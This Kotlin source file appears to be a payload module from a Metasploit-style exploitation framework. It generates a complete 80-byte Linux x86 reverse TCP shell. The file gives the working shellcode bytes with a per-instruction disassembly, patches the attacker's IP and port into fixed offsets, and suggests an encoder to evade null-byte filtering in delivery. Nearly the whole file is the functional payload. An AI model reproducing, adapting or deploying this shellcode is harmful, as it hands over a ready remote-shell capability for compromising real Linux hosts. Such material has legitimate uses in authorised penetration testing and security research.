package anc.modules.payloads.singles.linux

import anc.core.Rank
import anc.core.Options
import anc.core.payload.Payload
import anc.core.payload.PayloadType
import anc.core.optional
import anc.core.required
import rex.arch.Arch
import rex.arch.Platform

/**
 * Linux x86 reverse TCP shell — single-stage payload.
 *
 * Generates a self-contained 80-byte x86 shellcode that:
 *   1. Opens a TCP socket (socketcall SYS_SOCKET)
 *   2. Connects back to LHOST:LPORT (socketcall SYS_CONNECT)
 *   3. Redirects stdin/stdout/stderr to the socket via dup2
 *   4. Executes /bin//sh via execve
 *
 * LHOST and LPORT are patched into the template at known byte offsets.
 *
 * Tested on Linux kernel 5.x / 6.x x86 (32-bit) with standard glibc stack layout.
 * Null bytes are present in the template for zero-octets in the IP address —
 * use an encoder (e.g. encoders/x86/xor_additive) if the delivery vector is null-sensitive.
 */
class ReverseShellX86 : Payload() {
    override val name        = "Linux x86 Reverse TCP Shell"
    override val description = "Connects back to attacker and spawns /bin/sh"
    override val modulePath  = "singles/linux/shell_reverse_tcp"
    override val payloadType = PayloadType.Single
    override val arch        = listOf(Arch.X86)
    override val platform    = listOf(Platform.LINUX, Platform.UNIX)
    override val rank        = Rank.GREAT
    override val authors     = listOf("anckit")

    override val options = Options().apply {
        required<String>("LHOST", "Attacker IP to connect back to", default = "127.0.0.1")
        required<Int>   ("LPORT", "Attacker port to connect back to", default = 4444)
        optional<Int>   ("PrependFork", "Prepend a fork() call (0=disabled, 1=enabled)", default = 0)
    }

    override suspend fun run() {
        val bytes = generate()
        printStatus("Generated ${bytes.size} bytes")
        printGood(toByteArrayLiteral(bytes))
    }

    override suspend fun generate(): ByteArray {
        val lhost = datastore["LHOST"]?.toString() ?: options["LHOST"]!!.default.toString()
        val lport = (datastore["LPORT"]?.toString() ?: options["LPORT"]!!.default.toString()).toInt()
        return buildShellcode(lhost, lport)
    }

    companion object {
        /**
         * Byte offsets within the shellcode template where LHOST and LPORT are patched.
         * LHOST_OFFSET: 4 bytes, big-endian IPv4 (network byte order).
         * LPORT_OFFSET: 2 bytes, big-endian port (network byte order).
         */
        const val LHOST_OFFSET = 19
        const val LPORT_OFFSET = 25

        /**
         * 80-byte Linux/x86 reverse TCP shell shellcode template.
         *
         * Offsets 19-22 : LHOST (IPv4, big-endian / network byte order) — default 127.0.0.1
         * Offsets 25-26 : LPORT (16-bit, big-endian / network byte order) — default 4444 (0x115c)
         *
         * Disassembly outline:
         *   socket(AF_INET, SOCK_STREAM, 0)    → socketcall(1, args)
         *   connect(sockfd, &sin, 16)           → socketcall(3, args)
         *   dup2(sockfd, 2/1/0)                → loop
         *   execve("/bin//sh", argv, NULL)
         */
        private val TEMPLATE = byteArrayOf(
            // socket(AF_INET=2, SOCK_STREAM=1, IPPROTO_IP=0)
            0x6a, 0x66,                               // push 0x66  (SYS_SOCKETCALL)
            0x58,                                     // pop  eax
            0x6a, 0x01,                               // push 1     (SYS_SOCKET)
            0x5b,                                     // pop  ebx
            0x31, 0xd2.toByte(),                      // xor  edx, edx
            0x52,                                     // push edx   (IPPROTO_IP=0)
            0x6a, 0x01,                               // push 1     (SOCK_STREAM)
            0x6a, 0x02,                               // push 2     (AF_INET)
            0x89.toByte(), 0xe1.toByte(),             // mov  ecx, esp
            0xcd.toByte(), 0x80.toByte(),             // int  0x80  → eax=sockfd   [offset 17 end]

            // xchg eax↔esi  (save sockfd)
            0x96.toByte(),                            // xchg eax, esi             [offset 17]

            // build sockaddr_in on stack (reversed):
            //   push LHOST (4 bytes, big-endian)
            0x68,                                     // push dword (opcode)       [offset 18]
            0x7f, 0x00, 0x00, 0x01,                   // ← LHOST placeholder       [offset 19..22]
            //   push LPORT (2 bytes, big-endian via little-endian push word trick)
            0x66, 0x68,                               // push word (prefix+opcode) [offset 23..24]
            0x11, 0x5c,                               // ← LPORT placeholder       [offset 25..26]
            //   push AF_INET = 2
            0x66, 0x6a, 0x02,                         // push word 2               [offset 27..29]

            // connect(sockfd, &sockaddr_in, 16)
            0x89.toByte(), 0xe1.toByte(),             // mov  ecx, esp (sockaddr*)
            0x6a, 0x10,                               // push 16  (addrlen)
            0x51,                                     // push ecx
            0x56,                                     // push esi (sockfd)
            0x89.toByte(), 0xe1.toByte(),             // mov  ecx, esp (args*)
            0x6a, 0x66,                               // push 0x66
            0x58,                                     // pop  eax
            0x43,                                     // inc  ebx (2)
            0x43,                                     // inc  ebx (3 = SYS_CONNECT)
            0xcd.toByte(), 0x80.toByte(),             // int  0x80

            // dup2 loop: dup2(sockfd, 2), dup2(sockfd, 1), dup2(sockfd, 0)
            0x87.toByte(), 0xf3.toByte(),             // xchg esi, ebx (sockfd→ebx)
            0x6a, 0x02,                               // push 2
            0x59,                                     // pop  ecx
            0xb0.toByte(), 0x3f,                      // mov  al, 63 (dup2)
            0xcd.toByte(), 0x80.toByte(),             // int  0x80
            0x49,                                     // dec  ecx
            0x79, 0xf9.toByte(),                      // jns  -7  (→ mov al,63)

            // execve("/bin//sh", ["/bin//sh", NULL], NULL)
            0x31, 0xd2.toByte(),                      // xor  edx, edx
            0x52,                                     // push edx  (null terminator)
            0x68, 0x2f, 0x2f, 0x73, 0x68,            // push "//sh"
            0x68, 0x2f, 0x62, 0x69, 0x6e,            // push "/bin"
            0x89.toByte(), 0xe3.toByte(),             // mov  ebx, esp
            0x52,                                     // push edx  (NULL envp/argv[1])
            0x53,                                     // push ebx  (argv[0])
            0x89.toByte(), 0xe1.toByte(),             // mov  ecx, esp
            0xb0.toByte(), 0x0b,                      // mov  al, 11 (SYS_EXECVE)
            0xcd.toByte(), 0x80.toByte()              // int  0x80
        )

        /** Build shellcode with [lhost] and [lport] patched in. */
        fun buildShellcode(lhost: String, lport: Int): ByteArray {
            require(lport in 1..65535) { "LPORT must be 1–65535" }
            val sc = TEMPLATE.copyOf()
            // Patch LHOST (4 bytes, big-endian octets)
            val octets = lhost.split(".").map { it.toInt() }
            require(octets.size == 4) { "LHOST must be a dotted-quad IPv4 address" }
            octets.forEachIndexed { i, v -> sc[LHOST_OFFSET + i] = v.toByte() }
            // Patch LPORT (2 bytes, big-endian)
            sc[LPORT_OFFSET]     = (lport ushr 8).toByte()
            sc[LPORT_OFFSET + 1] = (lport and 0xFF).toByte()
            return sc
        }
    }
}
